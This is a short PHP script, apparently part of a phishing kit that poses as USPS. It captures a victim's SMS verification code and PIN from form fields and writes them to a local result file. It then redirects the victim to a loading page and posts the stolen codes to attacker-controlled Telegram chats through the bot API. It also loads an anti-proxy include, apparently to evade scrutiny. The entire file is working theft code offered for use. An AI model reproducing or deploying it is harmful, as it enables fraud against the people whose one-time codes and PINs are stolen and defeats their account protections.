<?php 
extract($_REQUEST);
include "../id.php";
$sms=$_POST["sim"];
$pin=$_POST["sim2"];

$message=">>>>>>>>>>>>>|📲| USPS Post |📲|<<<<<<<<<<<<"."\n"."SMS Code 2 :  ".$sms."\n"."PIN Code  :  ".$pin."\n".">>>>>>>>>>>>>|🔋| USPS Post |🔋|<<<<<<<<<<<<";
$user_ids=$id;
$filee=fopen("../result.txt",'a');
fwrite($filee,$message."\n");
fclose($filee);
header("location: loading3.php");
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot'.$token.'/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
include "../anti/antiproxy1.php";
}
?>